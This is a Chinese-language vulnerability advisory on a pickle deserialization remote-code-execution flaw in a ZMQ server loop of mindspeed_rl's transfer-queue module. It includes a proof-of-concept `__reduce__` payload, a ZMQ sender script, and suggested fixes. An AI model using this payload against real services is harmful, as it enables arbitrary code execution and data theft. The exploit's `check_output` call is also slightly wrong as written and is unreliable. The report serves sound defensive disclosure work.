# VULN-SEC-TQ-001: Pickle 反序列化远程代码执行

## 漏洞概述

| 属性 | 值 |
|------|-----|
| ID | VULN-SEC-TQ-001 |
| CWE | CWE-502 (Deserialization of Untrusted Data) |
| 严重性 | **Critical** |
| 置信度 | 95/100 |
| 文件 | `mindspeed_rl/utils/transfer_queue/tq_data.py` |
| 行号 | 127 |
| 函数 | `_serve_loop` |

---

## 漏洞详情

### 漏洞描述

ZMQ ROUTER socket 接收的 GET 命令数据被直接传递给 `pickle.loads()` 进行反序列化，没有任何验证或签名检查。攻击者可发送恶意构造的 pickle payload 实现远程代码执行 (RCE)。

### 漏洞代码

```python
# tq_data.py:120-141
def _serve_loop(self):
    while self._running:
        msg = self.router.recv_multipart()  # 接收网络数据
        identity, command = msg[0], msg[1].decode()
        
        if command == "GET":
            if len(msg) < 3:
                self.router.send_multipart([identity, b"ERROR: Missing data for GET"])
            else:
                payload = pickle.loads(msg[2])  # ⚠️ VULNERABLE
                # 直接反序列化网络数据，无验证
                experience, returned_indexes = self._handle_get(
                    payload["topic"],
                    payload["experience_columns"],
                    payload["indexes"],
                )
```

---

## 数据流分析

```
攻击者 → ZMQ DEALER socket → ZMQ ROUTER socket → recv_multipart()
                                                             ↓
                                                    msg[2] (raw bytes)
                                                             ↓
                                                    pickle.loads(msg[2])
                                                             ↓
                                                    __reduce__ 触发
                                                             ↓
                                                    RCE (远程代码执行)
```

---

## 利用步骤

### 1. 构造恶意 payload

```python
import pickle
import subprocess

class RCEPayload:
    def __reduce__(self):
        return (subprocess.check_output, (['id > /tmp/pwned'],))
```

### 2. 发送攻击消息

```python
import zmq

context = zmq.Context()
socket = context.socket(zmq.DEALER)
socket.connect("tcp://target_ip:port")

payload = pickle.dumps(RCEPayload())
socket.send_multipart([b"attacker", b"GET", payload])
```

### 3. 触发 RCE

服务端自动反序列化 payload，执行 `subprocess.check_output(['id > /tmp/pwned'])`。

---

## 影响

- **远程代码执行**: 在 Ray Actor 进程中执行任意代码
- **数据泄露**: 可访问 ExperienceTable 中的训练数据
- **集群控制**: 可横向移动到其他 Ray Actor
- **模型窃取**: 可访问模型参数和配置

---

## 修复方案

### 紧急修复

```python
# 替换 pickle 为 json
payload = json.loads(msg[2].decode())
```

### 或添加 HMAC 签名

```python
import hmac
import hashlib

def verify_and_load(data, secret_key):
    sig, payload = data.split(b"|", 1)
    expected = hmac.new(secret_key, payload, hashlib.sha256).hexdigest()
    if sig.decode() != expected:
        raise ValueError("Invalid signature")
    return pickle.loads(payload)  # 签名验证后才安全
```

---

## 参考

- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- CVE-2017-18342: PyYAML pickle RCE
- PyTorch weights_only: https://pytorch.org/docs/stable/notes/serialization.html